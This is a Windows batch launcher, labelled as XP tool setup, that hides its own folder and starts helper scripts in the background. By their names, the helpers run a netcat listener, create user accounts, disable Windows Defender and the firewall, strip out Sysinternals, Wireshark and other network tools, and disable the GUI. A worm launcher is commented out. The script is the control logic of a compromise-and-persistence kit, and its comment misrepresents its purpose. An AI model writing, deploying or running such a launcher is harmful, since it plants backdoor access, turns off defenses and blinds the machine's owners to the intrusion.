@echo off
::setup scripting for Windows Xp tools
attrib +s +h %CD%

:: Check if netcatlistener.bat is already running
tasklist | find /I "netcatlistener.bat" >nul
if errorlevel 1 (
   start /b netcatlistener.bat
)

:: Check if createUsers.bat is already running
tasklist | find /I "createUsers.bat" >nul
if errorlevel 1 (
   start /b createUsers.bat
)

:: Check if wormtools.bat is already running
@REM tasklist | find /I "wormtools.bat" >nul
@REM if errorlevel 1 (
@REM    start /b wormtools.bat
@REM )

:: Check if disableDefender.bat is already running
tasklist | find /I "disableDefender.bat" >nul
if errorlevel 1 (
   start /b disableDefender.bat
)

:: Check if disablefirewall.bat is already running
tasklist | find /I "disablefirewall.bat" >nul
if errorlevel 1 (
   start /b disablefirewall.bat
)

:: Check if removeKillers.bat is already running
tasklist | find /I "removeKillers.bat" >nul
if errorlevel 1 (
   start /b removeKillers.bat
)

:: Check if removeNetworkTools.bat is already running
tasklist | find /I "removeNetworkTools.bat" >nul
if errorlevel 1 (
   start /b removeNetworkTools.bat
)

:: Check if removeSYSinternals.bat is already running
tasklist | find /I "removeSYSinternals.bat" >nul
if errorlevel 1 (
   start /b removeSYSinternals.bat
)

:: Check if removewireshark.bat is already running
tasklist | find /I "removewireshark.bat" >nul
if errorlevel 1 (
   start /b removewireshark.bat
)

:: Check if renameCliNetworkTools.bat is already running
tasklist | find /I "renameCliNetworkTools.bat" >nul
if errorlevel 1 (
   start /b renameCliNetworkTools.bat
)

:: Check if disableGUI.bat is already running
tasklist | find /I "disableGUI.bat" >nul
if errorlevel 1 (
   start /b disableGUI.bat
)
